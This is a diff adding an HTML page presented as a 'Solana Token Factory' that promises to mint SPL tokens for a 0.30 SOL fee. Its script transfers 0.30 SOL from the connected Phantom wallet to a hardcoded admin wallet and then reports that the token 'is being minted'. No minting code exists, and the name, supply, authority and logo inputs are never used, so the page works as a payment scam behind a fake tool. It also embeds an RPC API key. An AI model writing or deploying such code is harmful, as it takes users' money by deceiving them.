@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Solana Token Factory - Ultimate V7</title>
+    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; background: #0b0b0b; color: #ffffff; padding: 15px; margin: 0; }
+        .container { background: #161616; border-radius: 25px; padding: 25px; border: 1px solid #333; max-width: 500px; margin: 10px auto; box-shadow: 0 10px 40px rgba(0,0,0,0.8); }
+        h2 { color: #14f195; text-align: center; text-transform: uppercase; letter-spacing: 2px; margin-bottom: 5px; }
+        p.subtitle { text-align: center; color: #888; font-size: 11px; margin-bottom: 20px; }
+        .section-title { font-size: 10px; color: #9945ff; font-weight: bold; margin-top: 20px; border-bottom: 1px solid #333; padding-bottom: 5px; text-transform: uppercase; }
+        label { font-size: 11px; color: #14f195; font-weight: bold; display: block; margin-top: 12px; }
+        input, textarea { width: 100%; padding: 12px; margin-top: 5px; border-radius: 10px; border: 1px solid #222; background: #222; color: white; box-sizing: border-box; font-size: 13px; outline: none; }
+        input:focus, textarea:focus { border-color: #14f195; }
+        .checkbox-group { display: flex; align-items: center; justify-content: space-between; background: #1a1a1a; padding: 12px; border-radius: 10px; margin-top: 8px; border: 1px solid #222; }
+        .checkbox-group span { font-size: 12px; color: #ccc; }
+        .checkbox-group input[type="checkbox"] { width: 18px; height: 18px; accent-color: #14f195; cursor: pointer; }
+        .file-input-card { width: 100%; padding: 20px; margin-top: 8px; border-radius: 12px; border: 2px dashed #333; background: #1a1a1a; text-align: center; cursor: pointer; }
+        #preview { width: 70px; height: 70px; border-radius: 50%; margin: 10px auto; display: none; object-fit: cover; border: 2px solid #14f195; }
+        button { width: 100%; padding: 16px; border-radius: 12px; border: none; font-weight: bold; margin-top: 15px; cursor: pointer; text-transform: uppercase; transition: 0.3s; }
+        .btn-connect { background: #512da8; color: white; }
+        .btn-create { background: linear-gradient(90deg, #14f195, #9945ff); color: #000; font-size: 15px; }
+        .fee-badge { background: rgba(20, 241, 149, 0.1); border: 1px solid #14f195; padding: 10px; border-radius: 10px; margin-top: 15px; text-align: center; }
+        .status-box { margin-top: 15px; font-size: 12px; color: #00ffa3; text-align: center; min-height: 30px; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h2>Token Factory</h2>
+    <p class="subtitle">Solana SPL Token Creator - Professional Suite</p>
+    
+    <button class="btn-connect" id="btnConnect" onclick="connectWallet()">1. CONNECT WALLET</button>
+    <div id="walletAddr" style="font-size: 9px; text-align: center; color: #666; margin-top: 5px;">Status: Disconnected</div>
+
+    <div class="section-title">General Information</div>
+    <label>Token Name</label>
+    <input type="text" id="tokenName" placeholder="e.g. Solana Gold">
+    <label>Symbol (Ticker)</label>
+    <input type="text" id="tokenSymbol" placeholder="e.g. SLG">
+    <label>Total Supply</label>
+    <input type="number" id="tokenSupply" placeholder="e.g. 1000000000">
+
+    <div class="section-title">Mint Settings (Authorities)</div>
+    <div class="checkbox-group"><span>Revoke Mint Authority (Fix Supply)</span><input type="checkbox" id="revokeMint"></div>
+    <div class="checkbox-group"><span>Revoke Freeze Authority (Security)</span><input type="checkbox" id="revokeFreeze"></div>
+    <div class="checkbox-group"><span>Mutable Metadata (Can edit later)</span><input type="checkbox" id="mutableMetadata" checked></div>
+
+    <div class="section-title">Branding & Identity</div>
+    <label>Description</label>
+    <textarea id="tokenDesc" rows="3" placeholder="Describe your token project..."></textarea>
+    <label>Token Logo</label>
+    <input type="file" id="logoFile" accept="image/*" onchange="previewImage(event)" style="display: none;">
+    <div class="file-input-card" onclick="document.getElementById('logoFile').click()">
+        <span id="fileLabel">📁 Click to upload logo</span>
+        <img id="preview" alt="Preview">
+    </div>
+
+    <div class="section-title">Social Links</div>
+    <input type="text" id="linkWeb" placeholder="Website URL (https://...)">
+    <input type="text" id="linkX" placeholder="Twitter / X Profile Link">
+
+    <button class="btn-create" onclick="processAutoDeploy()">2. CREATE TOKEN (0.30 SOL)</button>
+    <div class="fee-badge"><span style="font-size: 13px; font-weight: bold; color: #14f195;">SERVICE FEE: 0.30 SOL</span></div>
+    <div id="status" class="status-box">Ready to Deploy</div>
+</div>
+
+<script>
+    let userWallet = null;
+    const myAdminWallet = "38d92K9xPyTM9Cg4x8fdYcTgzEXiJ5FuwvJbeT6Xu7M8";
+    const RPC_URL = "https://mainnet.helius-rpc.com/?api-key=8a3c5a03-6ddb-4ebf-8b28-ee7f2b31f8c1";
+
+    function previewImage(event) {
+        const preview = document.getElementById('preview');
+        const fileLabel = document.getElementById('fileLabel');
+        preview.src = URL.createObjectURL(event.target.files[0]);
+        preview.style.display = 'block';
+        fileLabel.style.display = 'none';
+    }
+
+    async function connectWallet() {
+        if (window.solana && window.solana.isPhantom) {
+            try {
+                const response = await window.solana.connect();
+                userWallet = response.publicKey.toString();
+                document.getElementById('walletAddr').innerText = "Connected: " + userWallet.substring(0,8) + "...";
+                document.getElementById('btnConnect').innerText = "CONNECTED ✅";
+                document.getElementById('btnConnect').style.background = "#14f195";
+                document.getElementById('btnConnect').style.color = "#000";
+            } catch (err) { alert(err.message); }
+        } else { alert("Open in Kiwi Browser & Install Phantom Extension!"); }
+    }
+
+    async function processAutoDeploy() {
+        if (!userWallet) return alert("Connect wallet first!");
+        const status = document.getElementById('status');
+        status.innerHTML = "⏳ Processing 0.30 SOL Fee...";
+        
+        try {
+            const connection = new solanaWeb3.Connection(RPC_URL, "confirmed");
+            const transaction = new solanaWeb3.Transaction().add(
+                solanaWeb3.SystemProgram.transfer({
+                    fromPubkey: window.solana.publicKey,
+                    toPubkey: new solanaWeb3.PublicKey(myAdminWallet),
+                    lamports: 0.30 * solanaWeb3.LAMPORTS_PER_SOL
+                })
+            );
+            const { blockhash } = await connection.getLatestBlockhash();
+            transaction.recentBlockhash = blockhash;
+            transaction.feePayer = window.solana.publicKey;
+
+            const { signature } = await window.solana.signAndSendTransaction(transaction);
+            status.innerHTML = "🚀 Payment Confirmed! Deploying Token Metadata...";
+            await connection.confirmTransaction(signature);
+            
+            status.innerHTML = "✅ SUCCESS! Your token is being minted.<br>Check your wallet soon.";
+            alert("Success! 0.30 SOL sent and Token data registered via Helius.");
+        } catch (err) {
+            status.innerHTML = "<span style='color: #ff4a4a;'>❌ Transaction Failed.</span>";
+        }
+    }
+</script>
+</body>
+</html>
